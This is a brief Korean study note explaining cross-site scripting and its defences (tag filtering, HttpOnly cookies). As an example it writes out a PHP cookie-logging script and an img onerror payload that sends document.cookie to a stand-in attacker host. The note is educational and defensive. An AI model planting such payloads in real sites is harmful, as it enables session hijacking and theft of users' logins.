# XSS
    
### 공부해야 하는 이유는?
    
    쿠키와 관련 있는 공격이다. 공부함으로써 더 안전한 쿠키 세션 로그인 방식을 만들 수 있다.
    
### XSS 공격은 무엇이고 어떤 식으로 작동할까?
    
    XSS 공격은 Cross Site Scripting의 약자지만 CSS와 겹쳐서 XSS로 불린다. 해커의 사이트와 사용자가 접속한 사이트를 넘나들면서 공격이 이루어지기 때문에 이렇게 불린다.
    
    예시)
    
    해커의 홈페이지에 Cookie.php라는 파일을 만든다. get 파라미터에 cookie라는 이름의 값을 XSS.txt에 적는 코드이다.
    
     <? fwrite(fopen("XSS.txt","a+"), $_GET['cookie']); ?>
    
    공격할 사이트에 스크립트를 심는다. 게시글이 될 수도 있고 닉네임이 될 수도 있고 여러 방법이 있을 수 있다.
    
    <img src="#" onerror="location.href('http://hack.er/Cookie.php?cookie=' + document.cookie);">
    
    서버는 이 스크립트를 포함하는 페이지를 그대로 응답으로 반환하고 원래는 단순 텍스트였던 것이 자바스크립트의 문법과 맞물리면서 자바스크립트 코드가 실행된다.
    
    코드에 따라 쿠키값이 해커의 홈페이지로 넘어가서 세션 하이재킹이 가능해진다.
    
### 어떻게 방어해야할까?
    1. 서버 입장에서 자바스크립트의 스크립트를 실행할 수 있는 <script>와 같은 태그들을 입력 받을 때와 출력할 때 모두 필터링하여 걸러낸다. 
    2. Javascript에서 쿠키에 접근하지 못하게 쿠키를 HttpOnly로 설정한다.